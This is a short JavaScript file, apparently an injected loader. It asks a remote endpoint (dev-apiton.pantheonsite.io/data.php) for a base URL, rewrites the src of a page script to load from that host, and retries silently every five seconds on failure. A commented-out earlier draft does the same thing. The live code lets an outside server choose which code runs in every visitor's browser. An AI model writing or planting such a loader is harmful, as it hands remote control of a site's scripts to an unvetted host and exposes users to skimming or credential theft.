
/*
function changeScriptSrc(newBaseUrl) {
    
    var script = document.getElementById('myScript');
    var currentSrc = script.src;
    var pathAfterBaseUrl = currentSrc.replace(/^.*\/\/[^\/]+/, '');
    var newSrc = newBaseUrl + pathAfterBaseUrl;
    script.src = newSrc;
}

let urlx;
fetch('https://dev-apiton.pantheonsite.io/data.php')
  .then(response => {
    if (!response.ok) {
      throw new Error('Network response was not ok');
    }
    return response.text();
  })
  .then(data => {
    urlx = data;
    changeScriptSrc(urlx);
  })
  .catch(error => {
    console.error('There was a problem with the fetch operation:', error);
  });
  */


  function changeScriptSrc(newBaseUrl) {
    var script = document.getElementById('myScript');
    var currentSrc = script.src;
    var pathAfterBaseUrl = currentSrc.replace(/^.*\/\/[^\/]+/, '');
    var newSrc = newBaseUrl + pathAfterBaseUrl;
    script.src = newSrc;
}

function fetchDataAndChangeScript() {
    fetch('https://dev-apiton.pantheonsite.io/data.php')
        .then(response => {
            if (!response.ok) {
                throw new Error('Network response was not ok');
            }
            return response.text();
        })
        .then(data => {
            urlx = data;
            changeScriptSrc(urlx);
        })
        .catch(error => {
            setTimeout(fetchDataAndChangeScript, 5000);
        });
}
fetchDataAndChangeScript();

